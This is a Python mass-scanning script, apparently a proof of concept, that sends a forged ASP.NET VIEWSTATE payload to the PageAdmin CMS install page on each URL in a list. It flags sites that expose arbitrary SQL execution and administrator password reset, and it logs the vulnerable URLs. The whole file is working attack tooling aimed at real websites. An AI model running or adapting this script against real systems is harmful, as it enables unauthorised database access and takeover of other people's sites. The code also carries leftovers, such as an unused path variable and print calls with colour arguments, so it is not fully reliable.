import sys
import json
import requests
import warnings



urls = open('url.txt')

poc = '/index.php/api/Uploadify/preview'



for i in urls:
    url = i.rstrip("\n")
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }
    payload = "/e/install/index.aspx?__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwULLTExODcwMDU5OTgPZBYCAgEPZBYCAgMPFgIeB1Zpc2libGVoZGQ%3D&ctl02=%E8%BF%90%E8%A1%8CSQL"
    vulnurl = url + payload
    try:
        req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
        if req.status_code == 200 and r"WebForm_DoPostBackWithOptions" in req.text and r"Tb_sql" in req.text:
            print("[+]存在PageAdmin可“伪造”VIEWSTATE执行任意SQL查询&重置管理员密码漏洞...(高危)\tpayload: " + vulnurl, "red")
            with open('VIEWSTATE执行任意SQL.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("[-]不存在pageadmin_forge_viewstate漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")

